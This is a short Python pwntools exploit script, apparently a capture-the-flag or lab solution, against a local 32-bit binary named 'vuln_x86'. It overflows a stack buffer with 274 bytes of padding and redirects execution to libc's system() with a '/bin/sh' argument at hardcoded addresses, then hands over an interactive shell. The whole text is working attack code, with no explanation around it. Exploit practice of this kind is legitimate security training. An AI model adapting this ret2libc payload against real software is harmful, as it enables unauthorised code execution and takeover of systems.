#!/usr/bin/env python3
from pwn import *

context.terminal = ["wezterm", "start", "--"]

# we overflow saved rip after 274 bytes
overflow_offset_rip = 274

# we point rip to system
system_addr = 0xF7DAE670  # `system()` in libc
bin_sh_addr = 0xF7F28ED2  # `"/bin/sh"` in libc

# construct payload
payload = b"A" * overflow_offset_rip
payload += p32(system_addr)  # pack little endian
payload += p32(0xDEADBEEF)
payload += p32(bin_sh_addr)

# connect to the vulnerable program
p = process("./vuln_x86")
gdb.attach(p, api=True)

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
